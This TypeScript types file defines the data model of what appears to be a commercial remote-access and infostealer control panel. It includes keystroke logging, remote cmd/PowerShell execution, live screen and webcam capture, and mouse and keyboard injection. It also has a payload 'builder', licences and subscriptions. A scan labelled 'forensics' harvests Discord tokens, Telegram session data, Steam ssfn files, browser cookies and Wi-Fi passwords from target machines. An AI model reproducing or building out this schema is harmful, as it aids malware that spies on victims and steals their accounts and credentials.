// ==================== Device Types ====================

export type DeviceStatus = 'online' | 'offline' | 'warning';

export interface Device {
  id: string;
  hostname: string;
  ip: string;
  mac: string;
  status: DeviceStatus;
  os: string;
  lastSeen: string;
  uptime: number;
  systemInfo?: SystemInfo;
  agentVersion?: string;
  country?: string;
  countryCode?: string;
}

export interface SystemInfo {
  uptime?: number;
  os: {
    platform: string;
    version: string;
    arch: string;
    hostname: string;
  };
  cpu: {
    model: string;
    cores: number;
    speed: number;
    usage: number;
  };
  memory: {
    total: number;
    used: number;
    free: number;
    usagePercent: number;
  };
  disks: DiskInfo[];
  network: NetworkInterface[];
}

export interface DiskInfo {
  name: string;
  mount: string;
  type: string;
  total: number;
  used: number;
  free: number;
  usagePercent: number;
}

export interface NetworkInterface {
  name: string;
  ip: string;
  mac: string;
  speed: number;
}

// ==================== Process Types ====================

export interface ProcessInfo {
  pid: number;
  name: string;
  cpu: number;
  memory: number;
  user: string;
  status: string;
  startTime: string;
}

// ==================== File Manager Types ====================

export interface FileEntry {
  name: string;
  path: string;
  type: 'file' | 'directory';
  size: number;
  modified: string;
  permissions: string;
}

// ==================== Log Types ====================

export type LogLevel = 'info' | 'warning' | 'error' | 'critical';
export type LogCategory = 'system' | 'security' | 'activity' | 'keystroke' | 'connection' | 'file';

export interface LogEntry {
  id: string;
  timestamp: string;
  deviceId: string;
  deviceName: string;
  level: LogLevel;
  category: LogCategory;
  message: string;
  details?: string;
}

// ==================== Command Types ====================

export type ShellType = 'cmd' | 'powershell';

export interface CommandRequest {
  deviceId: string;
  command: string;
  shell: ShellType;
}

export interface CommandResult {
  id: string;
  deviceId: string;
  command: string;
  output: string;
  exitCode: number;
  timestamp: string;
  duration: number;
}

// ==================== Auth Types ====================

export interface User {
  id: string;
  username: string;
  role: 'admin' | 'viewer';
  avatar?: string;
  registeredAt: string;
  subscriptionExpires: string;
  email?: string;
}

export interface AuthState {
  user: User | null;
  isAuthenticated: boolean;
}

export interface LoginCredentials {
  username: string;
  password: string;
}

export interface TokenPayload {
  userId: string;
  username: string;
  role: string;
  iat: number;
  exp: number;
}

// ==================== WebSocket Types ====================

export type WSMessageType =
  | 'device_status'
  | 'device_removed'
  | 'system_info'
  | 'process_list'
  | 'screenshot'
  | 'command_result'
  | 'file_list'
  | 'download_result'
  | 'log_entry'
  | 'agent_log'
  | 'heartbeat'
  | 'agent_list'
  | 'register_admin'
  | 'command_request'
  | 'request_processes'
  | 'request_files'
  | 'request_screenshot'
  | 'request_download'
  | 'remove_device'
  | 'camera_list'
  | 'camera_frame'
  | 'request_camera_list'
  | 'request_camera_start'
  | 'request_camera_stop'
  | 'screen_frame'
  | 'request_screen_stream'
  | 'stop_screen_stream'
  | 'mouse_input'
  | 'keyboard_input'
  | 'forensic_request'
  | 'forensic_result'
  | 'auth_error';

export interface WSMessage<T = unknown> {
  type: WSMessageType;
  deviceId?: string;
  payload: T;
  timestamp: string;
}

// ==================== Dashboard Types ====================

export type DashboardView =
  | 'overview'
  | 'device'
  | 'processes'
  | 'files'
  | 'terminal'
  | 'logs'
  | 'screenshots'
  | 'camera'
  | 'settings'
  | 'builder'
  | 'licenses'
  | 'control'
  | 'forensics'
  | 'updates';

// ==================== Forensics Types ====================

export type ForensicScanType = 'sessions' | 'inventory' | 'full';

export interface ForensicFileEntry {
  path: string;
  size: number;
  modified: string;
  category: 'discord' | 'telegram' | 'cookies' | 'wifi' | 'document' | 'steam' | 'other';
}

export interface ForensicSessionData {
  discord: { found: boolean; tokens: string[]; paths: string[]; localStatePath?: string };
  telegram: { found: boolean; tdataPath: string; files: string[] };
  steam: { found: boolean; steamPath: string; ssfnFiles: string[]; configFiles: string[] };
  cookies: { browser: string; profilePath: string; found: boolean }[];
}

export interface ForensicInventoryData {
  system: {
    hostname: string;
    ip: string;
    mac: string;
    os: string;
    username: string;
    locale: string;
  };
  wifi: { ssid: string; auth: string; password: string }[];
  documents: ForensicFileEntry[];
  downloads: ForensicFileEntry[];
}

export interface ForensicResult {
  scanId: string;
  deviceId: string;
  timestamp: string;
  scanType: ForensicScanType;
  sessions?: ForensicSessionData;
  inventory?: ForensicInventoryData;
  files: ForensicFileEntry[];
  archiveReady: boolean;
  archiveData?: string;
  archiveName?: string;
  reportText?: string;
  error?: string;
  progress?: number;
  status: 'scanning' | 'complete' | 'error';
}

export interface DashboardStats {
  totalDevices: number;
  onlineDevices: number;
  offlineDevices: number;
  warningDevices: number;
  totalAlerts: number;
}
